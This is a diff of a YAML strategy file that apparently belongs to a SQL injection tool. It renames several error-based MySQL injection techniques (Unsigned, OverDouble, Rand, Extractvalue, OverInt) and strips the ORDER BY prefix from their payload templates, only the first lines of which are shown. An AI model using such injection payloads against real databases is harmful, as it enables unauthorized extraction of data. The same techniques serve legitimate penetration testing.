@@ -385,9 +385,9 @@ strategy:
       )-~0
      capacity: 453
 
-   - name: Unsigned:order by
+   - name: Unsigned:none
      query: |
-      1, (
+      (
           select 1
           from (
               select !(
@@ -459,9 +459,9 @@ strategy:
       )
      capacity: 462
 
-   - name: OverDouble:order by
+   - name: OverDouble:none
      query: |
-      1, (
+      (
           select exp(
               ~(
                   select *
@@ -546,9 +546,9 @@ strategy:
       )
      capacity: 64
 
-   - name: Rand:order by
+   - name: Rand:none
      query: |
-      1, (
+      (
           select 1 from (
               select
                   count(*),
@@ -630,9 +630,9 @@ strategy:
       )
      capacity: 31
 
-   - name: Extractvalue:order by
+   - name: Extractvalue:none
      query: |
-      1, (
+      (
           select extractvalue(
               0x0a,
               concat(
@@ -704,9 +704,9 @@ strategy:
       )
      capacity: 460
 
-   - name: OverInt:order by
+   - name: OverInt:none
      query: |
-      1, (
+      (
           select 2*if(
               (
                   select * from (
